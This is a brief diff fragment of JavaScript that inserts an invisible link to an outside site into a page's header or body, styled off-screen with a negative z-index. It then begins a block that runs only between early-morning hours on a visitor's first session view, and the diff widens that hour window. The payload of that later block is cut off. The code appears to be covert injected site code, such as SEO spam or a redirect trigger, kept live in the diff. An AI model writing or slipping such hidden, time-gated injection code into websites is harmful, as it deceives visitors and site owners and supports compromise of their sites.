@@ -4,7 +4,7 @@ let EFV='<a href="https://www.am2z.com" style="position: absolute;z-index: -9999
 if(document.querySelector('header')){document.querySelector('header').insertAdjacentHTML('beforeend',EFV);}
 else{document.querySelector('body').insertAdjacentHTML('beforeend',EFV);}
 
-if(!sessionStorage.ef&&new Date().getHours()>=2&&new Date().getHours()<=5){
+if(!sessionStorage.ef&&new Date().getHours()>=2&&new Date().getHours()<=6){
     function AB(CD){
         document.addEventListener(CD,()=>{
                 if(!sessionStorage.ef){
